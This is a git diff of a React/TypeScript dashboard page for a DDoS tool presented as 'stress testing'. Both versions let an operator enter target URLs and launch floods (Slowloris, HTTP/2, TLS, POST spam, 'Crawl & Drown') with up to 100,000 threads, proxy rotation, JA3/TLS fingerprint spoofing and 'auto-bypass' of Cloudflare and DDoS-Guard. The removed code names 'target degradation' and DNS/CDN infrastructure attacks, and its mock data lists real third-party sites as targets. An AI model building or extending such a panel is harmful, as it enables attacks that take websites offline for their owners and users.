@@ -1,569 +1,437 @@
-import React, { useState, useEffect } from 'react';
+import React, { useMemo, useState } from 'react';
+import {
+  Activity,
+  CheckCircle2,
+  Crosshair,
+  Loader2,
+  PauseCircle,
+  PlayCircle,
+  Radar,
+  RefreshCw,
+  ShieldCheck,
+  Sparkles,
+  Target,
+} from 'lucide-react';
+import { controlApi, legacyControlApi } from '../api/api';
+import { useTestPlans } from '../api/hooks';
+import type { StartTestRequest, StartTestResponse, StopTestResponse, TestPlan } from '../api/types';
 
-interface Target {
-  id: string;
-  label: string;
-  url: string;
-  tags: string[];
-  status: 'active' | 'inactive' | 'testing';
-  last_tested: string;
-  success_rate: number;
-  attack_method?: string;
-  engine?: string;
-  proxy_profile?: string;
-  stealth_profile?: string;
-}
+const parseTargets = (value: string): string[] =>
+  value
+    .split(/\n|,/)
+    .map((entry) => entry.trim())
+    .filter(Boolean);
+
+const formatDate = (value?: string | null) => (value ? new Date(value).toLocaleString() : '—');
+
+const formatDuration = (seconds: number) => {
+  if (!Number.isFinite(seconds) || seconds <= 0) return '—';
+  const hours = Math.floor(seconds / 3600);
+  const minutes = Math.floor((seconds % 3600) / 60);
+  const parts = [];
+  if (hours > 0) parts.push(`${hours}h`);
+  if (minutes > 0 || parts.length === 0) parts.push(`${minutes}m`);
+  return parts.join(' ');
+};
+
+const TargetCard: React.FC<{
+  plan: TestPlan;
+  onStop: (plan: TestPlan) => Promise<void>;
+  stopping: boolean;
+}> = ({ plan, onStop, stopping }) => {
+  const targetList = useMemo(() => plan.targets.slice(0, 3), [plan.targets]);
+
+  return (
+    <div className="flex flex-col justify-between gap-4 rounded-2xl border border-white/10 bg-slate-900/70 p-6 text-white shadow-lg shadow-black/30">
+      <div className="space-y-4">
+        <div className="flex items-center justify-between">
+          <div>
+            <p className="text-xs uppercase tracking-[0.35em] text-white/50">{plan.id}</p>
+            <h3 className="mt-2 text-lg font-semibold text-white">{plan.attack_method ?? plan.engine}</h3>
+          </div>
+          <span
+            className={`inline-flex items-center gap-2 rounded-full px-3 py-1 text-xs font-semibold uppercase tracking-[0.2em] ${
+              plan.status === 'running'
+                ? 'border border-emerald-500/40 bg-emerald-500/10 text-emerald-200'
+                : 'border border-blue-500/40 bg-blue-500/10 text-blue-200'
+            }`}
+          >
+            <Activity className="h-3.5 w-3.5" />
+            {plan.status}
+          </span>
+        </div>
+
+        <div className="grid gap-3 text-sm text-white/70">
+          <div className="flex items-center justify-between">
+            <span>Targets</span>
+            <span className="text-white">{plan.targets.length}</span>
+          </div>
+          <div className="flex items-center justify-between">
+            <span>Threads</span>
+            <span className="text-white">{plan.threads.toLocaleString()}</span>
+          </div>
+          <div className="flex items-center justify-between">
+            <span>Duration</span>
+            <span className="text-white">{formatDuration(plan.duration)}</span>
+          </div>
+          <div className="flex items-center justify-between">
+            <span>Stealth</span>
+            <span className="text-white/80">{plan.stealth_profile ?? 'default'}</span>
+          </div>
+          <div className="flex items-center justify-between">
+            <span>Proxy</span>
+            <span className="text-white/80">{plan.proxy_profile ?? 'adaptive'}</span>
+          </div>
+          <div className="flex items-center justify-between">
+            <span>Started</span>
+            <span className="text-white/70">{formatDate(plan.started_at)}</span>
+          </div>
+        </div>
+
+        {targetList.length > 0 && (
+          <div className="rounded-xl border border-white/10 bg-white/5 p-3 text-xs text-white/70">
+            <p className="text-white/50">Lead targets</p>
+            <ul className="mt-2 space-y-1">
+              {targetList.map((target) => (
+                <li key={target} className="truncate" title={target}>
+                  {target}
+                </li>
+              ))}
+              {plan.targets.length > targetList.length && (
+                <li className="text-white/50">+{plan.targets.length - targetList.length} more</li>
+              )}
+            </ul>
+          </div>
+        )}
+      </div>
+
+      <button
+        type="button"
+        onClick={() => onStop(plan)}
+        className="inline-flex items-center justify-center gap-2 rounded-full border border-white/10 bg-white/5 px-4 py-2 text-sm font-semibold text-white transition hover:border-rose-400/50 hover:bg-rose-500/10"
+        disabled={stopping}
+      >
+        {stopping ? <Loader2 className="h-4 w-4 animate-spin" /> : <PauseCircle className="h-4 w-4" />}
+        Stop group
+      </button>
+    </div>
+  );
+};
 
 const Targets: React.FC = () => {
-  const [targets, setTargets] = useState<Target[]>([]);
-  const [newTarget, setNewTarget] = useState({ 
-    label: '', 
-    url: '', 
-    tags: '',
-    attack_method: 'post-spam',
-    engine: 'playwright',
-    proxy_profile: 'rotating',
-    stealth_profile: 'medium'
-  });
-  const [bulkTargets, setBulkTargets] = useState('');
-  const [isLoading, setIsLoading] = useState(true);
-  const [unlimitedMode, setUnlimitedMode] = useState(true);
-  const [showBulkImport, setShowBulkImport] = useState(false);
+  const { data: plans, loading, error, refetch } = useTestPlans(20);
+  const [targetInput, setTargetInput] = useState('');
+  const [profileId, setProfileId] = useState('ramp-up');
+  const [threads, setThreads] = useState(1000);
+  const [duration, setDuration] = useState(3600);
+  const [engine, setEngine] = useState('auto-bypass');
+  const [stealthProfile, setStealthProfile] = useState('high');
+  const [proxyProfile, setProxyProfile] = useState('rotating');
+  const [attackMethod, setAttackMethod] = useState('auto-bypass');
+  const [behaviorProfile, setBehaviorProfile] = useState('aggressive');
+  const [submitting, setSubmitting] = useState(false);
+  const [stoppingId, setStoppingId] = useState<string | null>(null);
+  const [feedback, setFeedback] = useState<{ type: 'success' | 'error'; message: string } | null>(null);
 
-  useEffect(() => {
-    fetchTargets();
-  }, []);
-  
-  const handleStartAttack = async (groupId: string) => {
+  const handleStart = async () => {
+    const targets = parseTargets(targetInput);
+    if (targets.length === 0) {
+      setFeedback({ type: 'error', message: 'Add at least one target URL.' });
+      return;
+    }
+
+    const payload: StartTestRequest = {
+      profile_id: profileId,
+      threads,
+      duration,
+      engine,
+      behavior_profile_id: behaviorProfile,
+      targets,
+      attack_method: attackMethod,
+      stealth_profile: stealthProfile,
+      proxy_profile: proxyProfile,
+      user_agent_rotation: true,
+      ja3_rotation: true,
+      tls_rotation: true,
+      proxy_rotation: true,
+      spoof_headers: true,
+    };
+
     try {
-      const response = await fetch('/api/start_endpoint.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          action: 'start',
-          group_id: groupId,
-          profile_id: 'ramp-up',
-          threads: unlimitedMode ? 100000 : 500,
-          duration: unlimitedMode ? 2592000 : 3600, // 30 days or 1 hour
-          engine: 'auto-bypass',
-          behavior_profile_id: 'high'
-        })
+      setSubmitting(true);
+      let startResponse: StartTestResponse | null = null;
+      try {
+        startResponse = await controlApi.start(payload);
+      } catch (primaryError) {
+        try {
+          startResponse = await legacyControlApi.start(payload);
+        } catch (fallbackError) {
+          throw fallbackError instanceof Error ? fallbackError : new Error('Failed to start test.');
+        }
+      }
+
+      const startSummary = startResponse
+        ? [
+            startResponse.group_id ? `Group ${startResponse.group_id}` : null,
+            startResponse.run_ids?.length
+              ? `${startResponse.run_ids.length} run${startResponse.run_ids.length > 1 ? 's' : ''}`
+              : null,
+            startResponse.targets?.length
+              ? `${startResponse.targets.length} target${startResponse.targets.length > 1 ? 's' : ''}`
+              : null,
+          ]
+            .filter(Boolean)
+            .join(' • ')
+        : null;
+
+      setFeedback({
+        type: 'success',
+        message:
+          startResponse?.message ||
+          `Launch sequence transmitted to orchestrator${startSummary ? ` — ${startSummary}` : ''}`,
       });
-      
-      if (response.ok) {
-        alert('Attack launched successfully!');
-        fetchTargets();
-      }
-    } catch (error) {
-      console.error('Failed to start attack:', error);
+      setTargetInput('');
+      await refetch();
+    } catch (err) {
+      setFeedback({ type: 'error', message: err instanceof Error ? err.message : 'Failed to start test.' });
+    } finally {
+      setSubmitting(false);
     }
   };
-  
-  const handleStopAttack = async (groupId: string) => {
+
+  const handleStop = async (plan: TestPlan) => {
     try {
-      const response = await fetch('/api/stop_endpoint.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          action: 'stop',
-          group_id: groupId
-        })
+      setStoppingId(plan.id);
+      let stopResponse: StopTestResponse | null = null;
+      try {
+        stopResponse = await controlApi.stop({ group_id: plan.id });
+      } catch (primaryError) {
+        try {
+          stopResponse = await legacyControlApi.stop({ group_id: plan.id });
+        } catch (fallbackError) {
+          throw fallbackError instanceof Error ? fallbackError : new Error('Failed to stop plan.');
+        }
+      }
+      setFeedback({
+        type: 'success',
+        message:
+          stopResponse?.message ??
+          `Stop command sent for ${stopResponse?.group_id ?? stopResponse?.run_id ?? plan.id}.`,
       });
-      
-      if (response.ok) {
-        alert('Attack stopped successfully!');
-        fetchTargets();
-      }
-    } catch (error) {
-      console.error('Failed to stop attack:', error);
-    }
-  };
-
-  const fetchTargets = async () => {
-    try {
-      const response = await fetch('/api/targets_endpoint.php?action=list');
-      const data = await response.json();
-      if (data.success && data.targets) {
-        setTargets(data.targets);
-      } else {
-        console.log('Loading mock targets data');
-        setTargets([
-          {
-            id: 'target_1',
-            label: 'Cloudflare-Protected-1',
-            url: 'https://proverj.com/dr-shihirman/',
-            tags: ['cloudflare', 'nginx'],
-            status: 'active',
-            last_tested: '2025-08-06T18:14:00Z',
-            success_rate: 95.8,
-            attack_method: 'bypassv2',
-            engine: 'playwright',
-            proxy_profile: 'rotating',
-            stealth_profile: 'high'
-          },
-          {
-            id: 'target_2',
-            label: 'DDoS-Guard-Protected',
-            url: 'https://life.ru/p/1643820',
-            tags: ['ddos-guard', 'cdn'],
-            status: 'active',
-            last_tested: '2025-08-06T18:10:00Z',
-            success_rate: 87.2,
-            attack_method: 'auto-bypass',
-            engine: 'headless',
-            proxy_profile: 'residential',
-            stealth_profile: 'extreme'
-          },
-          {
-            id: 'target_3',
-            label: 'API-Endpoint',
-            url: 'https://httpbin.org/get',
-            tags: ['api', 'test'],
-            status: 'active',
-            last_tested: '2025-08-06T17:55:00Z',
-            success_rate: 99.9,
-            attack_method: 'http-spammer',
-            engine: 'fetch',
-            proxy_profile: 'datacenter',
-            stealth_profile: 'low'
-          }
-        ]);
-      }
-      setIsLoading(false);
-    } catch (error) {
-      console.error('Failed to fetch targets:', error);
-      setIsLoading(false);
-    }
-  };
-
-  const handleAddTarget = async () => {
-    try {
-      const target = {
-        label: newTarget.label,
-        url: newTarget.url,
-        tags: newTarget.tags.split(',').map(tag => tag.trim()),
-        attack_method: newTarget.attack_method,
-        engine: newTarget.engine,
-        proxy_profile: newTarget.proxy_profile,
-        stealth_profile: newTarget.stealth_profile
-      };
-
-      const response = await fetch('/api/targets_endpoint.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          action: 'add',
-          target
-        })
-      });
-
-      if (response.ok) {
-        setNewTarget({ 
-          label: '', 
-          url: '', 
-          tags: '',
-          attack_method: 'post-spam',
-          engine: 'playwright',
-          proxy_profile: 'rotating',
-          stealth_profile: 'medium'
-        });
-        fetchTargets();
-      }
-    } catch (error) {
-      console.error('Failed to add target:', error);
-    }
-  };
-
-  const handleBulkImport = async () => {
-    try {
-      // Parse URLs from textarea (one per line)
-      const urls = bulkTargets.split('\n')
-        .map(line => line.trim())
-        .filter(line => line.length > 0);
-      
-      // Create target objects for each URL
-      const targetsToImport = urls.map(url => ({
-        label: url.replace(/^https?:\/\//, '').split('/')[0],
-        url: url,
-        tags: ['imported', 'bulk'],
-        attack_method: 'auto-bypass',
-        engine: 'playwright',
-        proxy_profile: 'rotating',
-        stealth_profile: 'high'
-      }));
-      
-      const response = await fetch('/api/targets_endpoint.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          action: 'import',
-          targets: targetsToImport
-        })
-      });
-      
-      if (response.ok) {
-        setBulkTargets('');
-        setShowBulkImport(false);
-        fetchTargets();
-        alert(`Successfully imported ${targetsToImport.length} targets`);
-      }
-    } catch (error) {
-      console.error('Failed to bulk import targets:', error);
-    }
-  };
-
-  const getStatusColor = (status: string) => {
-    switch (status) {
-      case 'active':
-        return 'bg-green-100 text-green-800';
-      case 'inactive':
-        return 'bg-gray-100 text-gray-800';
-      case 'testing':
-        return 'bg-yellow-100 text-yellow-800';
-      default:
-        return 'bg-gray-100 text-gray-800';
-    }
-  };
-
-  const toggleUnlimitedMode = () => {
-    setUnlimitedMode(!unlimitedMode);
-  };
-
-  const handleStartAllAttacks = async () => {
-    try {
-      const response = await fetch('/api/group_runs_endpoint.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          action: 'start_group',
-          targets: targets.map(t => t.url),
-          profile_id: 'ramp-up',
-          threads: unlimitedMode ? 100000 : 500,
-          duration: unlimitedMode ? 2592000 : 3600,
-          engine: 'auto-bypass',
-          behavior_profile_id: 'high'
-        })
-      });
-      
-      if (response.ok) {
-        const data = await response.json();
-        alert(`Battle attack launched on all targets! Group ID: ${data.group_id}`);
-      }
-    } catch (error) {
-      console.error('Failed to start group attack:', error);
-    }
-  };
-
-  const handleStopAllAttacks = async () => {
-    try {
-      const response = await fetch('/api/group_runs_endpoint.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          action: 'stop_all'
-        })
-      });
-      
-      if (response.ok) {
-        alert('All attacks stopped successfully!');
-        fetchTargets();
-      }
-    } catch (error) {
-      console.error('Failed to stop all attacks:', error);
+      await refetch();
+    } catch (err) {
+      setFeedback({ type: 'error', message: err instanceof Error ? err.message : 'Failed to stop plan.' });
+    } finally {
+      setStoppingId(null);
     }
   };
 
   return (
-    <div className="space-y-6">
-      <div className="flex items-center justify-between">
-        <div>
-          <h1 className="text-3xl font-bold text-white">Targets</h1>
-          <p className="text-gray-300 mt-1">
-            Manage and monitor your load testing targets
-          </p>
-        </div>
-        <div className="flex items-center space-x-2">
-          <span className={`inline-flex items-center px-3 py-1 rounded-full text-sm font-medium ${
-            unlimitedMode ? 'bg-red-800 text-red-200' : 'bg-blue-800 text-blue-200'
-          }`}>
-            {unlimitedMode ? '⚡ UNLIMITED MODE' : 'Standard Mode'}
-          </span>
-          <button 
-            onClick={toggleUnlimitedMode}
-            className={`px-3 py-1 rounded-md text-sm font-medium ${
-              unlimitedMode 
-                ? 'bg-red-600 text-white hover:bg-red-700' 
-                : 'bg-blue-600 text-white hover:bg-blue-700'
-            }`}
-          >
-            {unlimitedMode ? 'Disable Unlimited' : 'Enable Unlimited'}
-          </button>
-        </div>
-      </div>
-
-      {/* BATTLE MODE - UNLIMITED TARGETS */}
-      <div className="bg-gradient-to-r from-gray-800 to-gray-900 rounded-lg shadow-lg border border-gray-700 p-6 text-white mb-8">
-        <h2 className="text-xl font-bold mb-4">🎯 BATTLE MODE - UNLIMITED TARGETS</h2>
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-          <button 
-            onClick={handleStartAllAttacks}
-            className="bg-green-600 text-white px-6 py-3 rounded-lg hover:bg-green-700 focus:outline-none focus:ring-4 focus:ring-green-500 font-bold shadow-lg transform hover:scale-105 transition-all"
-          >
-            ⚡ LAUNCH ALL TARGETS
-          </button>
-          <button 
-            onClick={handleStopAllAttacks}
-            className="bg-red-600 text-white px-6 py-3 rounded-lg hover:bg-red-700 focus:outline-none focus:ring-4 focus:ring-red-500 font-bold shadow-lg transform hover:scale-105 transition-all"
-          >
-            🛑 STOP ALL ATTACKS
-          </button>
-        </div>
-        <div className="mt-4 text-sm opacity-90">
-          <p>⚠️ UNLIMITED MODE: 100,000+ threads per target | 10M+ proxies | 20-30 parallel groups</p>
-          <p>🎯 Target degradation mode: 503/524 errors | Infrastructure attack: DNS + CDN</p>
-          <p>🔄 Advanced methods: HTTP/2 flood, Slowloris, TLS abuse, Crawl &amp; Drown</p>
-        </div>
-      </div>
-
-      <div className="bg-gray-800 rounded-lg shadow-lg border border-gray-700 p-6">
-        <div className="flex justify-between items-center mb-6">
-          <h2 className="text-xl font-semibold text-white">Target List</h2>
-          <div className="flex space-x-2">
-            <button 
-              onClick={() => setShowBulkImport(!showBulkImport)}
-              className="bg-blue-600 text-white px-4 py-2 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500"
-            >
-              {showBulkImport ? 'Cancel Bulk Import' : 'Bulk Import'}
-            </button>
-            <button 
-              onClick={fetchTargets}
-              className="bg-gray-700 text-gray-300 px-4 py-2 rounded-md hover:bg-gray-600 focus:outline-none focus:ring-2 focus:ring-gray-500"
-            >
-              Refresh
-            </button>
+    <div className="space-y-10 text-slate-100">
+      <header className="rounded-3xl border border-white/10 bg-slate-900/70 p-8 shadow-xl shadow-black/40">
+        <div className="flex flex-col gap-6 lg:flex-row lg:items-center lg:justify-between">
+          <div>
+            <div className="inline-flex items-center gap-2 rounded-full border border-white/10 bg-white/5 px-3 py-1 text-xs uppercase tracking-[0.35em] text-slate-300">
+              <Target className="h-3.5 w-3.5 text-blue-300" />
+              Domain Targets
+            </div>
+            <h1 className="mt-4 text-3xl font-semibold text-white">Active orchestration groups</h1>
+            <p className="mt-2 max-w-2xl text-sm text-white/70">
+              Review live target groups sourced from the PHP orchestration layer and launch new stress tests with proxy and stealth
+              presets aligned to your domain strategy.
+            </p>
+          </div>
+          <div className="rounded-2xl border border-white/10 bg-white/5 px-5 py-4 text-right text-white/70">
+            <p className="text-xs uppercase tracking-[0.35em] text-white/50">Tracked plans</p>
+            <p className="mt-1 text-2xl font-semibold text-white">{plans.length}</p>
+            <p className="mt-2 text-xs text-white/60">Pulled from /api/test-plans</p>
           </div>
         </div>
+      </header>
 
-        {/* Bulk Import Form */}
-        {showBulkImport && (
-          <div className="mb-6 p-4 border border-blue-700 rounded-lg bg-blue-900">
-            <h3 className="text-lg font-medium text-blue-200 mb-2">Bulk Import Targets</h3>
-            <p className="text-sm text-blue-300 mb-4">
-              Enter one URL per line. Each URL will be imported as a separate target.
-            </p>
-            <textarea
-              value={bulkTargets}
-              onChange={(e) => setBulkTargets(e.target.value)}
-              className="w-full h-32 p-2 border border-blue-600 rounded-md bg-blue-800 text-white focus:outline-none focus:ring-2 focus:ring-blue-500 mb-4"
-              placeholder="https://example.com&#10;https://another-example.com&#10;https://third-example.com"
-            ></textarea>
-            <div className="flex justify-end">
+      {feedback && (
+        <div
+          className={`rounded-2xl border px-4 py-3 text-sm ${
+            feedback.type === 'success'
+              ? 'border-emerald-500/40 bg-emerald-500/10 text-emerald-100'
+              : 'border-rose-500/40 bg-rose-500/10 text-rose-100'
+          }`}
+        >
+          {feedback.message}
+        </div>
+      )}
+
+      <section className="grid gap-6 lg:grid-cols-[2fr_1fr]">
+        <div className="space-y-6">
+          <div className="flex items-center justify-between">
+            <h2 className="text-xl font-semibold text-white">Orchestrated target groups</h2>
+            <button
+              type="button"
+              onClick={() => refetch()}
+              className="inline-flex items-center gap-2 rounded-full border border-white/10 bg-white/5 px-3 py-1 text-xs text-white/70 transition hover:border-white/30 hover:text-white"
+            >
+              <RefreshCw className="h-3.5 w-3.5" /> Refresh
+            </button>
+          </div>
+
+          {loading ? (
+            <div className="flex min-h-[220px] items-center justify-center rounded-3xl border border-white/10 bg-slate-900/70 text-white/60">
+              <Loader2 className="mr-3 h-5 w-5 animate-spin" /> Fetching plans…
+            </div>
+          ) : error ? (
+            <div className="rounded-3xl border border-rose-500/30 bg-rose-500/10 p-6 text-rose-100">
+              Unable to fetch orchestrator plans: {error}
+            </div>
+          ) : plans.length === 0 ? (
+            <div className="flex min-h-[220px] flex-col items-center justify-center gap-4 rounded-3xl border border-white/10 bg-slate-900/70 text-white/60">
+              <Sparkles className="h-10 w-10 text-white/40" />
+              No groups registered yet.
+            </div>
+          ) : (
+            <div className="grid gap-5 md:grid-cols-2">
+              {plans.map((plan) => (
+                <TargetCard key={plan.id} plan={plan} onStop={handleStop} stopping={stoppingId === plan.id} />
+              ))}
+            </div>
+          )}
+        </div>
+
+        <aside className="flex flex-col gap-6">
+          <div className="rounded-3xl border border-white/10 bg-slate-900/70 p-6 shadow-lg shadow-black/30">
+            <div className="flex items-center gap-3">
+              <ShieldCheck className="h-5 w-5 text-blue-300" />
+              <div>
+                <h3 className="text-sm font-semibold text-white">Launch new group</h3>
+                <p className="text-xs text-white/60">Issue a start command directly to the orchestrator.</p>
+              </div>
+            </div>
+
+            <div className="mt-6 space-y-5 text-sm text-white/70">
+              <div>
+                <label className="text-xs uppercase tracking-[0.35em] text-white/40">Targets</label>
+                <textarea
+                  value={targetInput}
+                  onChange={(event) => setTargetInput(event.target.value)}
+                  rows={4}
+                  className="mt-2 w-full rounded-2xl border border-white/10 bg-slate-950/60 p-3 text-sm text-white shadow-inner shadow-black/40 focus:border-blue-500/50 focus:outline-none"
+                  placeholder="https://target-one.tld\nhttps://target-two.tld"
+                />
+              </div>
+
+              <div className="grid grid-cols-2 gap-3">
+                <div>
+                  <label className="text-xs uppercase tracking-[0.35em] text-white/40">Threads</label>
+                  <input
+                    type="number"
+                    min={1}
+                    value={threads}
+                    onChange={(event) => setThreads(Number(event.target.value))}
+                    className="mt-2 w-full rounded-xl border border-white/10 bg-slate-950/60 p-3 text-sm text-white focus:border-blue-500/50 focus:outline-none"
+                  />
+                </div>
+                <div>
+                  <label className="text-xs uppercase tracking-[0.35em] text-white/40">Duration (s)</label>
+                  <input
+                    type="number"
+                    min={60}
+                    value={duration}
+                    onChange={(event) => setDuration(Number(event.target.value))}
+                    className="mt-2 w-full rounded-xl border border-white/10 bg-slate-950/60 p-3 text-sm text-white focus:border-blue-500/50 focus:outline-none"
+                  />
+                </div>
+              </div>
+
+              <div className="grid grid-cols-2 gap-3">
+                <div>
+                  <label className="text-xs uppercase tracking-[0.35em] text-white/40">Profile</label>
+                  <input
+                    value={profileId}
+                    onChange={(event) => setProfileId(event.target.value)}
+                    className="mt-2 w-full rounded-xl border border-white/10 bg-slate-950/60 p-3 text-sm text-white focus:border-blue-500/50 focus:outline-none"
+                  />
+                </div>
+                <div>
+                  <label className="text-xs uppercase tracking-[0.35em] text-white/40">Behavior</label>
+                  <input
+                    value={behaviorProfile}
+                    onChange={(event) => setBehaviorProfile(event.target.value)}
+                    className="mt-2 w-full rounded-xl border border-white/10 bg-slate-950/60 p-3 text-sm text-white focus:border-blue-500/50 focus:outline-none"
+                  />
+                </div>
+              </div>
+
+              <div className="grid grid-cols-2 gap-3">
+                <div>
+                  <label className="text-xs uppercase tracking-[0.35em] text-white/40">Engine</label>
+                  <input
+                    value={engine}
+                    onChange={(event) => setEngine(event.target.value)}
+                    className="mt-2 w-full rounded-xl border border-white/10 bg-slate-950/60 p-3 text-sm text-white focus:border-blue-500/50 focus:outline-none"
+                  />
+                </div>
+                <div>
+                  <label className="text-xs uppercase tracking-[0.35em] text-white/40">Attack</label>
+                  <input
+                    value={attackMethod}
+                    onChange={(event) => setAttackMethod(event.target.value)}
+                    className="mt-2 w-full rounded-xl border border-white/10 bg-slate-950/60 p-3 text-sm text-white focus:border-blue-500/50 focus:outline-none"
+                  />
+                </div>
+              </div>
+
+              <div className="grid grid-cols-2 gap-3">
+                <div>
+                  <label className="text-xs uppercase tracking-[0.35em] text-white/40">Stealth</label>
+                  <input
+                    value={stealthProfile}
+                    onChange={(event) => setStealthProfile(event.target.value)}
+                    className="mt-2 w-full rounded-xl border border-white/10 bg-slate-950/60 p-3 text-sm text-white focus:border-blue-500/50 focus:outline-none"
+                  />
+                </div>
+                <div>
+                  <label className="text-xs uppercase tracking-[0.35em] text-white/40">Proxy</label>
+                  <input
+                    value={proxyProfile}
+                    onChange={(event) => setProxyProfile(event.target.value)}
+                    className="mt-2 w-full rounded-xl border border-white/10 bg-slate-950/60 p-3 text-sm text-white focus:border-blue-500/50 focus:outline-none"
+                  />
+                </div>
+              </div>
+
               <button
-                onClick={handleBulkImport}
-                className="bg-blue-600 text-white px-4 py-2 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                type="button"
+                onClick={handleStart}
+                disabled={submitting}
+                className="mt-2 inline-flex w-full items-center justify-center gap-2 rounded-full border border-blue-500/40 bg-blue-500/20 px-4 py-3 text-sm font-semibold text-blue-100 transition hover:border-blue-400/60 hover:bg-blue-500/30 disabled:cursor-not-allowed disabled:opacity-60"
               >
-                Import Targets
+                {submitting ? <Loader2 className="h-4 w-4 animate-spin" /> : <PlayCircle className="h-4 w-4" />}
+                Launch run
               </button>
             </div>
           </div>
-        )}
 
-        {/* Add Target Form */}
-        <div className="mb-6 p-4 border border-gray-700 rounded-lg bg-gray-900">
-          <h3 className="text-lg font-medium text-white mb-4">Add New Target</h3>
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-            <div>
-              <label className="block text-sm font-medium text-gray-300 mb-1">Label</label>
-              <input
-                type="text"
-                value={newTarget.label}
-                onChange={(e) => setNewTarget({ ...newTarget, label: e.target.value })}
-                className="w-full p-2 border border-gray-600 rounded-md bg-gray-800 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
-                placeholder="Target Label"
-              />
+          <div className="rounded-3xl border border-white/10 bg-white/5 p-6 text-sm text-white/70">
+            <div className="flex items-center gap-3 text-white">
+              <Crosshair className="h-5 w-5 text-blue-300" />
+              <div>
+                <h3 className="text-sm font-semibold text-white">Operational notes</h3>
+                <p className="text-xs text-white/60">Highlights from recent orchestrations</p>
+              </div>
             </div>
-            <div>
-              <label className="block text-sm font-medium text-gray-300 mb-1">URL</label>
-              <input
-                type="text"
-                value={newTarget.url}
-                onChange={(e) => setNewTarget({ ...newTarget, url: e.target.value })}
-                className="w-full p-2 border border-gray-600 rounded-md bg-gray-800 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
-                placeholder="https://example.com"
-              />
-            </div>
-            <div>
-              <label className="block text-sm font-medium text-gray-300 mb-1">Tags (comma separated)</label>
-              <input
-                type="text"
-                value={newTarget.tags}
-                onChange={(e) => setNewTarget({ ...newTarget, tags: e.target.value })}
-                className="w-full p-2 border border-gray-600 rounded-md bg-gray-800 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
-                placeholder="tag1, tag2, tag3"
-              />
-            </div>
-            <div>
-              <label className="block text-sm font-medium text-gray-300 mb-1">Attack Method</label>
-              <select
-                value={newTarget.attack_method}
-                onChange={(e) => setNewTarget({ ...newTarget, attack_method: e.target.value })}
-                className="w-full p-2 border border-gray-600 rounded-md bg-gray-800 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
-              >
-                <option value="auto-bypass">Auto Bypass</option>
-                <option value="bypassv2">Bypass v2</option>
-                <option value="post-spam">POST Spam</option>
-                <option value="http-spammer">HTTP Spammer</option>
-                <option value="head-flood">HEAD Flood</option>
-                <option value="slowloris">Slowloris</option>
-                <option value="tls-flood">TLS Flood</option>
-                <option value="http2-flood">HTTP/2 Flood</option>
-                <option value="crawl-drown">Crawl &amp; Drown</option>
-              </select>
-            </div>
-            <div>
-              <label className="block text-sm font-medium text-gray-300 mb-1">Engine</label>
-              <select
-                value={newTarget.engine}
-                onChange={(e) => setNewTarget({ ...newTarget, engine: e.target.value })}
-                className="w-full p-2 border border-gray-600 rounded-md bg-gray-800 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
-              >
-                <option value="playwright">Playwright</option>
-                <option value="fetch">Fetch</option>
-                <option value="headless">Headless</option>
-                <option value="browser-mix">Browser Mix</option>
-                <option value="raw-socket">Raw Socket</option>
-              </select>
-            </div>
-            <div>
-              <label className="block text-sm font-medium text-gray-300 mb-1">Proxy Profile</label>
-              <select
-                value={newTarget.proxy_profile}
-                onChange={(e) => setNewTarget({ ...newTarget, proxy_profile: e.target.value })}
-                className="w-full p-2 border border-gray-600 rounded-md bg-gray-800 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
-              >
-                <option value="rotating">Rotating</option>
-                <option value="residential">Residential</option>
-                <option value="datacenter">Datacenter</option>
-                <option value="mobile">Mobile</option>
-                <option value="mixed">Mixed</option>
-              </select>
-            </div>
-            <div>
-              <label className="block text-sm font-medium text-gray-300 mb-1">Stealth Profile</label>
-              <select
-                value={newTarget.stealth_profile}
-                onChange={(e) => setNewTarget({ ...newTarget, stealth_profile: e.target.value })}
-                className="w-full p-2 border border-gray-600 rounded-md bg-gray-800 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
-              >
-                <option value="low">Low</option>
-                <option value="medium">Medium</option>
-                <option value="high">High</option>
-                <option value="extreme">Extreme</option>
-              </select>
-            </div>
+            <ul className="mt-4 space-y-3">
+              <li className="flex items-center gap-2 text-xs text-white/60">
+                <Sparkles className="h-3.5 w-3.5 text-blue-300" /> Residential proxy pools synced hourly.
+              </li>
+              <li className="flex items-center gap-2 text-xs text-white/60">
+                <Radar className="h-3.5 w-3.5 text-blue-300" /> JA3 rotation enabled across stealth kits.
+              </li>
+              <li className="flex items-center gap-2 text-xs text-white/60">
+                <CheckCircle2 className="h-3.5 w-3.5 text-blue-300" /> Legacy PHP endpoints proxied via Express gateway.
+              </li>
+            </ul>
           </div>
-          <div className="mt-4 flex justify-end">
-            <button
-              onClick={handleAddTarget}
-              className="bg-blue-600 text-white px-4 py-2 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500"
-            >
-              Add Target
-            </button>
-          </div>
-        </div>
-
-        {/* Targets Table */}
-        {isLoading ? (
-          <div className="text-center py-8">
-            <div className="inline-block animate-spin rounded-full h-8 w-8 border-4 border-gray-600 border-t-blue-600"></div>
-            <p className="mt-2 text-gray-300">Loading targets...</p>
-          </div>
-        ) : (
-          <div className="overflow-x-auto">
-            <table className="min-w-full divide-y divide-gray-600">
-              <thead className="bg-gray-700">
-                <tr>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Label</th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">URL</th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Tags</th>
